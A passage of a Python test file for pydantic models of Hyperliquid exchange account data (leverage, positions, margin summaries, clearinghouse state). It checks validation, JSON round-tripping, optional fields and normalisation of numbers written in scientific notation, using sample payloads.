                "crossMarginSummary",
                "withdrawable",
            ]),
            malicious_user_state_strategy(),
            min_size=3,
            max_size=5,
        )
    )
    def test_user_state_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All user state models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by clearinghouse state
        # model
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawClearinghouseState.model_validate(complete_malicious_data)

    @given(
        leverage_data=valid_leverage_data(),
        position_data=valid_position_info_data(),
        margin_data=valid_margin_summary_data(),
    )
    def test_user_state_json_serialization_properties(
        self,
        leverage_data: dict[str, Any],
        position_data: dict[str, Any],
        margin_data: dict[str, Any],
    ) -> None:
        """Property: User state models should maintain JSON serialization compatibility."""
        # Skip invalid data
        try:
            # Validate leverage
            assume(leverage_data.get("type") in ["cross", "isolated"])
            leverage_value = leverage_data.get("value")
            assume(isinstance(leverage_value, int) and leverage_value >= 0)

            # Validate position
            assume(
                isinstance(position_data.get("coin"), str) and position_data.get("coin", "").strip()
            )

            # Validate margin
            for field in ["accountValue", "totalMarginUsed", "totalNtlPos", "totalRawUsd"]:
                assume(isinstance(margin_data[field], str) and margin_data[field].strip())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Test leverage serialization
        leverage_obj = HyperliquidRawLeverage.model_validate(leverage_data)
        leverage_json = leverage_obj.model_dump_json()
        leverage_parsed = json.loads(leverage_json)
        leverage_reconstructed = HyperliquidRawLeverage.model_validate(leverage_parsed)
        assert leverage_reconstructed.type == leverage_obj.type
        assert leverage_reconstructed.value == leverage_obj.value

        # Test margin summary serialization
        margin_obj = HyperliquidRawMarginSummary.model_validate(margin_data)
        margin_json = margin_obj.model_dump_json()
        margin_parsed = json.loads(margin_json)
        margin_reconstructed = HyperliquidRawMarginSummary.model_validate(margin_parsed)
        assert isinstance(margin_reconstructed.account_value, str)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawLeverage_real_world_example() -> None:
    """Test with real-world leverage data."""
    payload = {
        "type": "cross",
        "value": 5,
    }
    obj = HyperliquidRawLeverage.model_validate(payload)
    assert obj.type == "cross"
    assert obj.value == 5


def test_HyperliquidRawPositionInfo_real_world_example() -> None:
    """Test with real-world position info data."""
    payload = {
        "coin": "ETH",
        "entryPx": "1234.56",
        "leverage": {"type": "cross", "value": 5},
        "liquidationPx": "1000.00",
        "marginUsed": "100.00",
        "maxLeverage": 10,
        "positionValue": "200.00",
        "returnOnEquity": "0.05",
        "szi": "1.0",
        "unrealizedPnl": "0.01",
    }
    obj = HyperliquidRawPositionInfo.model_validate(payload)
    assert obj.coin == "ETH"
    assert obj.leverage.type == "cross"
    assert obj.max_leverage == 10


def test_HyperliquidRawMarginSummary_real_world_example() -> None:
    """Test with real-world margin summary data."""
    payload = {
        "accountValue": "1000.0",
        "totalMarginUsed": "100.0",
        "totalNtlPos": "200.0",
        "totalRawUsd": "1000.0",
    }
    obj = HyperliquidRawMarginSummary.model_validate(payload)
    assert obj.account_value == "1000"
    assert obj.total_margin_used == "100"


def test_HyperliquidRawAssetPosition_real_world_example() -> None:
    """Test with real-world asset position data."""
    payload = {
        "asset": "ETH",
        "position": {
            "coin": "ETH",
            "entryPx": "1234.56",
            "leverage": {"type": "cross", "value": 5},
            "liquidationPx": "1000.00",
            "marginUsed": "100.00",
            "maxLeverage": 10,
            "positionValue": "200.00",
            "returnOnEquity": "0.05",
            "szi": "1.0",
            "unrealizedPnl": "0.01",
        },
        "type": "perp",
    }
    obj = HyperliquidRawAssetPosition.model_validate(payload)
    assert obj.asset == "ETH"
    assert obj.position.coin == "ETH"
    assert obj.type == "perp"


def test_HyperliquidRawClearinghouseState_real_world_example() -> None:
    """Test with real-world clearinghouse state data."""
    payload = {
        "assetPositions": [
            {
                "asset": "ETH",
                "position": {
                    "coin": "ETH",
                    "entryPx": "1234.56",
                    "leverage": {"type": "cross", "value": 5},
                    "liquidationPx": "1000.00",
                    "marginUsed": "100.00",
                    "maxLeverage": 10,
                    "positionValue": "200.00",
                    "returnOnEquity": "0.05",
                    "szi": "1.0",
                    "unrealizedPnl": "0.01",
                },
                "type": "perp",
            }
        ],
        "marginSummary": {
            "accountValue": "1000.0",
            "totalMarginUsed": "100.0",
            "totalNtlPos": "200.0",
            "totalRawUsd": "1000.0",
        },
        "crossMaintenanceMarginUsed": "10.00",
        "crossMarginSummary": {
            "accountValue": "1000.0",
            "totalMarginUsed": "100.0",
            "totalNtlPos": "200.0",
            "totalRawUsd": "1000.0",
        },
        "isolatedMaintenanceMarginUsed": "5.00",
        "isolatedMarginSummary": {
            "accountValue": "500.0",
            "totalMarginUsed": "50.0",
            "totalNtlPos": "100.0",
            "totalRawUsd": "500.0",
        },
        "withdrawable": "50.00",
        "time": 1641886630,
    }
    obj = HyperliquidRawClearinghouseState.model_validate(payload)
    assert len(obj.asset_positions) == 1
    assert obj.asset_positions[0].asset == "ETH"
    assert obj.margin_summary.account_value == "1000"


def test_HyperliquidRawUserStateRequestPayload_real_world_example() -> None:
    """Test with real-world user state request data."""
    payload = {
        "type": "clearinghouseState",
        "user": "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
    }
    obj = HyperliquidRawUserStateRequestPayload.model_validate(payload)
    assert obj.type == "clearinghouseState"
    assert obj.user == "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9"


def test_HyperliquidRawClearinghouseState_empty_positions_example() -> None:
    """Test with empty asset positions."""
    payload: dict[str, Any] = {
        "assetPositions": [],
        "marginSummary": {
            "accountValue": "0",
            "totalMarginUsed": "0",
            "totalNtlPos": "0",
            "totalRawUsd": "0",
        },
        "crossMaintenanceMarginUsed": "0",
        "crossMarginSummary": {
            "accountValue": "0",
            "totalMarginUsed": "0",
            "totalNtlPos": "0",
            "totalRawUsd": "0",
        },
        "withdrawable": "0",
    }
    obj = HyperliquidRawClearinghouseState.model_validate(payload)
    assert len(obj.asset_positions) == 0
    assert obj.margin_summary.account_value == "0"


def test_HyperliquidRawPositionInfo_optional_fields_example() -> None:
    """Test with optional fields set to None."""
    payload = {
        "coin": "BTC",
        "entryPx": None,
        "leverage": {"type": "isolated", "value": 10},
        "liquidationPx": None,
        "marginUsed": "50.00",
        "maxLeverage": 20,
        "positionValue": "500.00",
        "returnOnEquity": "0.10",
        "szi": "0.5",
        "unrealizedPnl": "-25.50",
    }
    obj = HyperliquidRawPositionInfo.model_validate(payload)
    assert obj.coin == "BTC"
    assert obj.entry_px is None
    assert obj.liquidation_px is None
    assert obj.leverage.type == "isolated"


def test_HyperliquidRawAssetPosition_optional_asset_example() -> None:
    """Test with optional asset field set to None."""
    payload = {
        "asset": None,
        "position": {
            "coin": "SOL",
            "entryPx": "45.67",
            "leverage": {"type": "cross", "value": 3},
            "liquidationPx": "35.00",
            "marginUsed": "75.00",
            "maxLeverage": 5,
            "positionValue": "150.00",
            "returnOnEquity": "0.03",
            "szi": "2.0",
            "unrealizedPnl": "5.25",
        },
        "type": None,
    }
    obj = HyperliquidRawAssetPosition.model_validate(payload)
    assert obj.asset is None
    assert obj.position.coin == "SOL"
    assert obj.type is None


def test_HyperliquidRawPositionInfo_scientific_notation_example() -> None:
    """Test with scientific notation in decimal fields."""
    payload = {
        "coin": "AVAX",
        "entryPx": "1e2",
        "leverage": {"type": "cross", "value": 2},
        "liquidationPx": "8.5e1",
        "marginUsed": "1.5e2",
        "maxLeverage": 8,
        "positionValue": "3e2",
        "returnOnEquity": "2.5e-2",
        "szi": "1.5e0",
        "unrealizedPnl": "-1.25e1",
    }
    obj = HyperliquidRawPositionInfo.model_validate(payload)
    assert obj.coin == "AVAX"
    assert obj.entry_px == "100"  # Normalized from 1e2
    assert obj.leverage.value == 2
